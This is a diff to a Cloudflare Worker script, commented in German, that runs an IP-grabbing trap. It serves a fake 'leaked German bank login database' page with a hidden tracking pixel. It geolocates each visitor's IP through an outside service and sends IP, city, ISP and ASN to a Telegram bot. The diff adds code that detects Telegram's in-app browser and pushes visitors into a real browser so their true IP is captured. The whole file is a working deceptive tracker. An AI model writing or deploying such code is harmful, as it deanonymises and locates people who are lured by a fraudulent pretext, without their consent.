@@ -2,39 +2,8 @@ export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
 
-    // --- TEIL 1: DIE LANDING PAGE (Erkennt Telegram und blockt es) ---
+    // --- TEIL 1: DIE LANDING PAGE ---
     if (url.pathname === "/" || url.pathname === "/leak") {
-      const ua = request.headers.get("User-Agent") || "";
-      
-      // Prüfen, ob der User im Telegram In-App-Browser ist
-      const isTelegram = ua.includes("TelegramBot") || ua.includes("Telegram");
-
-      if (isTelegram) {
-        // TELEGRAM ANSICHT: Nur ein Button, kein Inhalt, kein Tracker!
-        const html = `
-        <!DOCTYPE html>
-        <html lang="de">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>dumps11-02-2026 (Bank Login database Deutschland)</title>
-            <style>
-                body { background-color: #0a0a0a; color: #ccc; font-family: sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-                .btn { display: block; width: 100%; max-width: 350px; padding: 18px; background-color: #e0e0e0; color: #000; text-decoration: none; font-weight: bold; font-size: 16px; text-transform: uppercase; border-radius: 5px; }
-            </style>
-        </head>
-        <body>
-            <div>
-                <p style="color:#888; font-size:14px;">Sicherheits-Gateway blockiert diesen Browser.</p>
-                <a href="${url.origin}?browser=1&c=dumps_db" class="btn">Open in Browser to login</a>
-            </div>
-        </body>
-        </html>
-        `;
-        return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
-      }
-
-      // ECHTER BROWSER ANSICHT (Safari/Chrome) - Hier feuert der Tracker!
       const html = `
       <!DOCTYPE html>
       <html lang="de">
@@ -43,12 +12,13 @@ export default {
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
           <title>dumps11-02-2026 (Bank Login database Deutschland)</title>
           <style>
-              body { background-color: #0a0a0a; color: #cccccc; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
-              .container { max-width: 800px; margin: 20px auto; background: #111; border: 1px solid #222; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
-              h1 { color: #ffffff; font-size: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; }
-              .meta { font-size: 13px; color: #777; margin-bottom: 40px; display: flex; justify-content: space-between; }
-              .btn { display: block; width: 100%; padding: 18px; background-color: #e0e0e0; color: #000; text-align: center; text-decoration: none; font-weight: bold; font-size: 15px; text-transform: uppercase; border: none; cursor: pointer; }
-              .footer { margin-top: 40px; font-size: 11px; color: #444; text-align: center; text-transform: uppercase; letter-spacing: 2px; }
+              body { background-color: #0a0a0a; color: #cccccc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px; }
+              .container { max-width: 600px; margin: 20px auto; background: #111; border: 1px solid #222; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
+              h1 { color: #ffffff; font-size: 18px; border-bottom: 1px solid #333; padding-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; }
+              .meta { font-size: 12px; color: #777; margin-bottom: 30px; display: flex; flex-wrap: wrap; gap: 10px; }
+              .btn { display: block; width: 100%; padding: 18px; background-color: #e0e0e0; color: #000; text-align: center; text-decoration: none; font-weight: bold; font-size: 15px; text-transform: uppercase; border: none; cursor: pointer; box-sizing: border-box; border-radius: 4px; }
+              .btn:hover { background-color: #ffffff; }
+              .footer { margin-top: 30px; font-size: 11px; color: #444; text-align: center; text-transform: uppercase; }
           </style>
       </head>
       <body>
@@ -62,16 +32,28 @@ export default {
                   <span>Status: Unencrypted</span>
               </div>
 
-              <!-- DER TRACKER FEUERT JETZT, DA WIR IM ECHTEN BROWSER SIND -->
-              <img src="/pixel?c=dumps_db" style="display:none;" />
+              <!-- 1. TRACKER FEUERT BEIM LADEN (Egal wo) -->
+              <img src="/pixel?c=load_${url.searchParams.get('c') || 'default'}" style="display:none;" />
 
-              <!-- DER BUTTON (Leitet weiter) -->
-              <a href="https://t.me/dein_telegram_username" class="btn">Database entschlüsseln</a>
+              <!-- 2. BUTTON: Erzwingt das Öffnen im echten Browser durch einen speziellen Link -->
+              <a href="https://watcher.rthvzkr6jv.workers.dev/?open=true&c=${url.searchParams.get('c') || 'default'}" class="btn">Open in Browser to login</a>
 
               <div class="footer">
-                  Secure Gateway | Protocol 443 | Session Encrypted
+                  Secure Gateway | Protocol 443
               </div>
           </div>
+          
+          <script>
+            // Kleiner Trick: Wenn wir im echten Browser sind (nicht Telegram), zeigen wir den normalen Button
+            // Wenn wir in Telegram sind, zwingen wir Safari zum Öffnen.
+            if (navigator.userAgent.includes("Telegram")) {
+                document.querySelector('.btn').innerText = "Open in Browser to login";
+                document.querySelector('.btn').href = window.location.href + "?open=true";
+            } else {
+                document.querySelector('.btn').innerText = "Database entschlüsseln";
+                document.querySelector('.btn').href = "https://t.me/dein_telegram_username";
+            }
+          </script>
       </body>
       </html>
       `;
@@ -82,13 +64,11 @@ export default {
     if (url.pathname === "/pixel") {
       const ip = request.headers.get("CF-Connecting-IP") || "unknown";
       const ua = request.headers.get("User-Agent") || "unknown";
-      const lang = request.headers.get("Accept-Language") || "unknown";
       const tag = url.searchParams.get("c") || "unbekannt";
       const t = new Date().toISOString();
 
       let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt";
-      let lat = "?", lon = "?";
-
+      
       try {
         const res = await fetch(`https://ipwho.is/${ip}`);
         const data = await res.json();
@@ -96,21 +76,21 @@ export default {
           loc = `${data.city || '?'}, ${data.country || '?'}`;
           isp = data.connection?.isp || "?";
           asn = `AS${data.connection?.asn || '?'}`;
-          lat = data.latitude || "?";
-          lon = data.longitude || "?";
         }
       } catch (e) {}
 
       if (env.BOT_TOKEN && env.CHAT_ID) {
+        // Unterscheidung für den Bot: Ist es Telegram oder ein echter Browser?
+        const isTelegram = ua.includes("Telegram");
+        const source = isTelegram ? "TELEGRAM (Unnütz)" : "BROWSER (Echte IP)";
+        
         const msg = 
+          `Quelle: ${source}\n` +
           `Tag: ${tag}\n` +
           `IP: ${ip}\n` +
           `Ort: ${loc}\n` +
-          `GPS: ${lat}, ${lon}\n` +
           `Provider: ${isp}\n` +
           `ASN: ${asn}\n` +
-          `Sprache: ${lang}\n` +
-          `Device: ${ua}\n` +
           `Zeit: ${t}`;
 
         try {
@@ -126,6 +106,6 @@ export default {
       return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
     }
 
-    return new Response("404 Not Found", { status: 404 });
+    return new Response("404", { status: 404 });
   }
 };
